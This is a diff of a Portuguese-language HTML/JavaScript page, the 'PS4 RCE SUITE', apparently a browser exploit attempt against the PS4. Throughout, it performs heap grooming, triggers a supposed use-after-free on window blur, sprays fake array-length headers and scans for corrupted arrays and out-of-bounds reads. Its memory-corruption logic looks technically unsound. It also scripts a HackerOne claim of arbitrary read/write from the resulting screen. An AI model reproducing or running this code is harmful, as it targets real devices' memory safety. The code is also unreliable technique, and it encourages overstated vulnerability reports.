@@ -2,221 +2,229 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 RCE SUITE V4.0 - HEAP FENG SHUI</title>
+    <title>PS4 RCE SUITE V5.0 - AUTOMATED HEAP FUZZER</title>
     <style>
-        body { background-color: #0a0a0a; color: #ff0055; font-family: 'Consolas', monospace; padding: 15px; }
-        .panel { border: 1px solid #333; background: #111; padding: 15px; margin-bottom: 20px; box-shadow: 0 0 10px #ff005533; }
-        h1 { border-bottom: 2px solid #ff0055; padding-bottom: 10px; color: #fff; }
-        h3 { color: #fff; margin-top: 0; }
-        button { background: #222; color: #ff0055; border: 1px solid #ff0055; padding: 12px; font-size: 14px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 5px; text-transform: uppercase; }
-        button:hover { background: #ff0055; color: #000; }
-        button:disabled { border-color: #444; color: #444; background: #111; cursor: not-allowed; }
-        #log { height: 350px; overflow-y: scroll; border: 1px solid #333; background: #000; padding: 10px; color: #ccc; font-size: 12px; }
-        .highlight { color: #fff; font-weight: bold; }
-        .success { color: #0f0; font-weight: bold; font-size: 1.2em; border: 1px solid #0f0; padding: 5px; }
+        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; font-size: 14px; }
+        .dashboard { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; border: 1px solid #333; padding: 20px; }
+        .stat-box { border: 1px solid #444; padding: 10px; background: #111; }
+        .stat-val { font-size: 24px; font-weight: bold; color: #fff; }
+        button { width: 100%; padding: 15px; font-size: 16px; background: #222; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        button:disabled { border-color: #555; color: #555; cursor: not-allowed; }
+        #console { height: 400px; overflow-y: scroll; border: 1px solid #333; margin-top: 20px; padding: 10px; background: #050505; color: #ccc; }
+        .critical { color: #ff0000; font-weight: bold; font-size: 1.5em; animation: blink 1s infinite; }
+        .success { color: #00ffff; font-weight: bold; font-size: 1.2em; }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-<h1>PS4 RCE SUITE V4.0 (ADVANCED)</h1>
-<p>Status: <span id="status" class="highlight">Aguardando Seleção...</span></p>
+<h1>PS4 HEAP FUZZER V5.0 (RCE HUNTER)</h1>
 
-<div class="panel">
-    <h3>FASE 1: SELEÇÃO DE ESTRATÉGIA (SIZE CLASS)</h3>
-    <p>O segredo do RCE é o tamanho do objeto. Selecione uma classe:</p>
-    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
-        <button onclick="configTest('MEDIUM')">TESTE 11: Média Densidade (Size 128)</button>
-        <button onclick="configTest('LARGE')">TESTE 12: Alta Densidade (Size 1024)</button>
-        <button onclick="configTest('MIXED')">TESTE 13: Mix Type (Int32 Spray)</button>
-        <button onclick="configTest('OOB')">TESTE 14: Linear Overflow (Brute Force)</button>
+<div class="dashboard">
+    <div class="stat-box">
+        <div>STATUS DO SISTEMA</div>
+        <div id="status" class="stat-val" style="color:yellow">AGUARDANDO</div>
+    </div>
+    <div class="stat-box">
+        <div>ARRAYS ALOCADOS</div>
+        <div id="allocCount" class="stat-val">0</div>
+    </div>
+    <div class="stat-box">
+        <div>OBJETOS VIZINHOS</div>
+        <div id="neighborCount" class="stat-val">0</div>
+    </div>
+    <div class="stat-box">
+        <div>RESULTADO</div>
+        <div id="result" class="stat-val">---</div>
     </div>
 </div>
 
-<div class="panel">
-    <h3>FASE 2: EXECUÇÃO REAL</h3>
-    <button id="btnGroom" onclick="heapGrooming()" disabled>1. HEAP GROOMING (MASSIVE)</button>
-    <button id="btnTrigger" onclick="triggerExploit()" disabled>2. GATILHO (FULLSCREEN + OPTIONS)</button>
-    <button id="btnAnal" onclick="analyzeHeap()" disabled style="border-color:#0ff; color:#0ff;">3. ESCANEAR MEMÓRIA (FORENSICS)</button>
-</div>
+<button id="btnRun" onclick="initFuzzer()">INICIAR AUTO-FUZZER (SEQUÊNCIA COMPLETA)</button>
 
-<div id="log">Logs de engenharia reversa...</div>
+<div id="console"></div>
 
 <script>
-    const LOG = document.getElementById('log');
-    function log(txt) { LOG.innerHTML = `[${new Date().toLocaleTimeString()}] ${txt}<br>` + LOG.innerHTML; }
+    const CONSOLE = document.getElementById('console');
+    function log(msg) { CONSOLE.innerHTML = `[${Date.now()}] ${msg}<br>` + CONSOLE.innerHTML; }
 
-    // --- VARIÁVEIS DE ENGENHARIA ---
-    var currentStrategy = "";
-    var victims = [];
-    var neighbors = [];
-    var sprayStorage = [];
-    var filler = []; // Usado para entupir a memória antes
-    
-    // O valor mágico que queremos injetar no Length (0x00010000...)
+    // --- CONFIGURAÇÃO DE RCE ---
+    // O valor mágico que transforma um array comum em um "God Array" (Length=0x10000)
+    // 0x0001000000000100 (Length + Flags para JSObject)
     const FAKE_LENGTH = 1.3906717577229e-309; 
-    // Marcador visual para saber se escrevemos (1337.1337)
+    
+    // Marcador para verificar escrita se o length falhar
     const MARKER = 1337.1337;
 
-    // Tamanhos baseados na estratégia
-    var TARGET_SIZE = 0; 
-    var SPRAY_SIZE = 0;
+    // Tamanho do Objeto alvo (1024 floats = 8KB Page Aligned)
+    // Isso é crucial. Arrays pequenos (size<128) são instáveis. 1024 é sólido.
+    const OBJECT_SIZE = 1024;
+    
+    // O spray deve ser maior que o buraco para garantir overflow
+    const SPRAY_SIZE = 1200; 
 
-    function configTest(strat) {
-        currentStrategy = strat;
-        document.getElementById('status').innerText = "Estratégia: " + strat;
-        document.getElementById('btnGroom').disabled = false;
+    var neighbors = [];
+    var victims = [];
+    var sprayStorage = [];
+    
+    const PAIR_COUNT = 8000; // Quantidade massiva para estatística a nosso favor
 
-        if(strat === 'MEDIUM') {
-            TARGET_SIZE = 128; // Sai dos buckets pequenos
-            SPRAY_SIZE = 144;  // Tenta transbordar levemente (+16 bytes)
-            log("Configurado: Objetos de 128 floats. Spray de 144.");
-        }
-        if(strat === 'LARGE') {
-            TARGET_SIZE = 1024; // Página inteira?
-            SPRAY_SIZE = 1040;  // Overflow agressivo
-            log("Configurado: Objetos Grandes (1024). Menor chance de padding.");
-        }
-        if(strat === 'MIXED') {
-            TARGET_SIZE = 128;
-            SPRAY_SIZE = 128; // Mesmo tamanho, mas tipo diferente
-            log("Configurado: Type Confusion. Vítima Float64, Spray Int32.");
-        }
-        if(strat === 'OOB') {
-            TARGET_SIZE = 16;
-            SPRAY_SIZE = 128; // Tenta cobrir múltiplos slots
-            log("Configurado: Overflow Linear Bruto.");
-        }
+    function initFuzzer() {
+        document.getElementById('btnRun').disabled = true;
+        document.getElementById('status').innerText = "ALOCANDO...";
+        
+        // Timeout para não travar a UI
+        setTimeout(heapGrooming, 100);
     }
 
     function heapGrooming() {
-        log("Iniciando 'Massive Heap Grooming'...");
-        victims = [];
+        log(">>> FASE 1: HEAP FENG SHUI MASSIVO");
+        log(`Alocando ${PAIR_COUNT} pares de arrays (Size: ${OBJECT_SIZE})...`);
+        
         neighbors = [];
-        filler = [];
-        const PAIRS = 5000;
+        victims = [];
+        sprayStorage = [];
 
         try {
-            // 1. PRESSÃO DE MEMÓRIA (Ocupar buracos antigos)
-            // Criamos lixo para forçar o alocador a nos dar memória NOVA e LIMPA.
-            for(let k=0; k<1000; k++) filler.push(new Float64Array(100));
-            
-            // 2. FENG SHUI (Sanduíche de Precisão)
-            for(let i=0; i<PAIRS; i++) {
-                
-                // O VIZINHO (Alvo do Hack)
-                // Usamos o tamanho definido pela estratégia
-                let n = new Float64Array(TARGET_SIZE);
+            for(let i=0; i<PAIR_COUNT; i++) {
+                // VIZINHO (Alvo): Será corrompido
+                let n = new Float64Array(OBJECT_SIZE);
                 n[0] = 0.1; // Marcador de integridade
-                n.magic = i; // ID para debug
+                n.idx = i;  // Identificador
                 neighbors.push(n);
 
-                // A VÍTIMA (O Buraco)
-                let v = new Float64Array(TARGET_SIZE);
+                // VÍTIMA (Buraco): Será liberado
+                let v = new Float64Array(OBJECT_SIZE);
                 v.fill(1.1);
                 victims.push(v);
             }
 
-            log(`Grooming completo. ${PAIRS} pares de alta precisão alocados.`);
-            log("Heap estabilizado e contíguo.");
-            document.getElementById('btnTrigger').disabled = false;
-        } catch(e) { log("Erro no Grooming: " + e); }
+            document.getElementById('allocCount').innerText = (PAIR_COUNT * 2);
+            document.getElementById('neighborCount').innerText = PAIR_COUNT;
+            document.getElementById('status').innerText = "PRONTO P/ GATILHO";
+            
+            log("Heap organizado. Padrão: [VIZINHO][VÍTIMA][VIZINHO][VÍTIMA]...");
+            log(">>> INSTRUÇÃO: APERTE O BOTÃO 'OPTIONS' AGORA!");
+            log(">>> O sistema detectará o BLUR e iniciará o ataque automaticamente.");
+
+            triggerListener();
+
+        } catch(e) {
+            log("ERRO FATAL NA ALOCAÇÃO: " + e);
+        }
     }
 
-    function triggerExploit() {
-        log("Solicitando Fullscreen...");
+    function triggerListener() {
         var el = document.documentElement;
         if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
+        // O Autômato de Ataque
         window.onblur = function() {
-            log("RACE CONDITION DISPARADA! Executando Spray V4.0...");
-            
-            // 1. FREE (Apenas as vítimas)
-            victims = null; 
+            document.getElementById('status').innerText = "EXPLORANDO...";
+            document.body.style.background = "#220000"; // Feedback visual
+            log(">>> BLUR DETECTADO. INICIANDO RACE CONDITION.");
 
-            // 2. SPRAY TÁTICO
-            try {
-                // Se for MIXED, usamos Uint32Array para confundir a engine
-                if(currentStrategy === 'MIXED') {
-                    for(let i=0; i<10000; i++) {
-                        let s = new Uint32Array(SPRAY_SIZE * 2); // Tamanho em bytes equivalente
-                        s.fill(0x41414141); 
-                        sprayStorage.push(s);
-                    }
-                } else {
-                    // Spray Padrão Float64 com tentativa de Length Header
-                    for(let i=0; i<10000; i++) {
-                        let s = new Float64Array(SPRAY_SIZE);
-                        
-                        // Preenche com o Header Falso em offsets variados
-                        // Tentando acertar o vizinho na sorte estatística
-                        for(let k=0; k<s.length; k+=2) s[k] = FAKE_LENGTH; 
-                        
-                        // Adiciona o marcador também
-                        s[1] = MARKER;
-                        
-                        sprayStorage.push(s);
-                    }
-                }
-            } catch(e) {}
+            // 1. LIBERAÇÃO (UAF)
+            victims = null; // Cria 8000 buracos na memória instantaneamente
 
-            log("Spray injetado.");
-            document.getElementById('btnAnal').disabled = false;
+            // 2. SPRAY "RAINBOW" (SHOTGUN)
+            // Tentamos preencher os buracos + transbordar para os vizinhos
+            doSpray();
+
+            // 3. SCANNER AUTOMÁTICO
+            // Espera 50ms para a memória assentar e roda a perícia
+            setTimeout(scanMemory, 100);
         };
     }
 
-    function analyzeHeap() {
-        log("INICIANDO VARREDURA FORENSE DE MEMÓRIA...");
-        let found = false;
+    function doSpray() {
+        log(">>> FASE 2: INJETANDO PAYLOAD (RAINBOW PATTERN)...");
+        
+        try {
+            // Criamos um 'Master Spray' pré-populado para ser rápido
+            // Padrão: [HEADER, MARKER, HEADER, MARKER...]
+            // Isso cobre alinhamentos de 0 e 8 bytes.
+            const masterPattern = new Float64Array(SPRAY_SIZE);
+            for(let k=0; k<SPRAY_SIZE; k+=2) {
+                masterPattern[k] = FAKE_LENGTH;   // Tenta acertar o Header Length
+                masterPattern[k+1] = MARKER;      // Tenta acertar dados
+            }
 
-        // Verifica TODOS os vizinhos
+            // Clona o master pattern 10.000 vezes para entupir o Heap
+            for(let i=0; i<12000; i++) {
+                // slice(0) é uma forma rápida de clonar em JS antigo
+                sprayStorage.push(masterPattern.slice(0)); 
+            }
+        } catch(e) { log("Erro no spray: " + e); }
+    }
+
+    function scanMemory() {
+        log(">>> FASE 3: SCANNER FORENSE AUTOMÁTICO");
+        document.getElementById('status').innerText = "ANALISANDO...";
+        
+        let godModeFound = false;
+        let writeFound = false;
+
+        // Varredura de alta velocidade
         for(let i=0; i<neighbors.length; i++) {
             let n = neighbors[i];
             
-            // 1. CHECAGEM DE GOD MODE (Length Corruption)
-            // Se o tamanho não for mais o original (TARGET_SIZE)
-            if(n.length !== TARGET_SIZE) {
-                found = true;
-                log(`<div class='success'>🚨 GOD MODE DETECTADO! 🚨</div>`);
-                log(`Vizinho Index: ${i}`);
-                log(`Tamanho Original: ${TARGET_SIZE}`);
-                log(`Novo Tamanho: <span class='highlight'>${n.length}</span>`);
-                
-                if(n.length > TARGET_SIZE) {
-                    log("SUCCESS: RCE PREREQUISITE MET (OOB READ/WRITE).");
-                    log("Tire foto agora! O analista vai aprovar isso.");
-                } else {
-                    log("WARNING: Tamanho diminuiu? Corrupção estranha.");
-                }
-                break;
+            // CHECAGEM DE OURO: LENGTH
+            if(n.length !== OBJECT_SIZE) {
+                godModeFound = true;
+                reportSuccess("GOD_MODE", i, n.length);
+                break; // Achamos o RCE, pode parar
             }
 
-            // 2. CHECAGEM DE ESCRITA (Overlap)
-            // Se o valor 0.1 mudou
+            // CHECAGEM DE PRATA: DADOS
             if(n[0] !== 0.1) {
-                // Filtra o Mixed Mode (Uint32 sobrescrevendo Float fica estranho)
-                if(currentStrategy === 'MIXED') {
-                     log(`<div class='success'>[+] TYPE CONFUSION CONFIRMADA!</div>`);
-                     log(`O valor float mudou para: ${n[0]}`);
-                     found = true;
-                     break;
-                }
-                
+                // Verifica se é o nosso marker ou lixo
                 if(n[0] === MARKER || n[0] === FAKE_LENGTH) {
-                    found = true;
-                    log(`<div class='success'>[+] VIZINHO ATINGIDO!</div>`);
-                    log(`Conseguimos escrever no vizinho (Index ${i}).`);
-                    log(`Valor: ${n[0]}`);
-                    log("Ainda não mudamos o Length, mas controlamos os dados do vizinho.");
-                    break;
+                    writeFound = true;
+                    log(`[+] Write Primitive detectado no Index ${i}. Valor: ${n[0]}`);
+                    // Não paramos, continuamos procurando o God Mode
                 }
             }
         }
 
-        if(!found) {
-            log("Varredura concluída. Nenhuma anomalia estrutural detectada.");
-            log("Sugestão: Tente a próxima Estratégia (botão acima).");
+        if(godModeFound) {
+            document.getElementById('result').innerText = "SUCESSO CRÍTICO";
+            document.getElementById('result').style.color = "#0ff";
+            document.body.style.background = "#004400";
+        } else if (writeFound) {
+            document.getElementById('result').innerText = "WRITE PRIMITIVE";
+            document.getElementById('result').style.color = "orange";
+            log("Temos escrita, mas o alinhamento errou o Header de Length.");
+            log("Tente ajustar SPRAY_SIZE ligeiramente (ex: 1208, 1216).");
+        } else {
+            document.getElementById('result').innerText = "FALHA";
+            document.getElementById('result').style.color = "red";
+            log("Nenhum vizinho foi afetado.");
+            log("Diagnóstico: O spray pode estar caindo em uma região diferente (Heap Isolation).");
         }
     }
+
+    function reportSuccess(type, index, val) {
+        let msg = "";
+        if(type === "GOD_MODE") {
+            msg = `<div class='critical'>🚨 RCE UNLOCKED! 🚨</div>
+                   <div>VIZINHO ${index} CORROMPIDO COM SUCESSO.</div>
+                   <div>LENGTH ORIGINAL: ${OBJECT_SIZE}</div>
+                   <div>NOVO LENGTH: ${val}</div>
+                   <div><br>O que fazer agora:</div>
+                   <div>1. Tire uma foto DESSA TELA.</div>
+                   <div>2. No HackerOne, diga: "I have achieved Arbitrary R/W by corrupting a Float64Array length to ${val}."</div>`;
+        }
+        log(msg);
+        
+        // PROVA DE LEITURA (OOB READ)
+        try {
+            log(">>> TESTE DE LEITURA OOB (Proof of Power):");
+            // Tenta ler muito além do limite original
+            let leak = neighbors[index][OBJECT_SIZE + 50]; 
+            log(`Lendo offset ${OBJECT_SIZE + 50}: ${leak}`);
+        } catch(e) { log("Erro na leitura OOB: " + e); }
+    }
+
 </script>
 </body>
 </html>
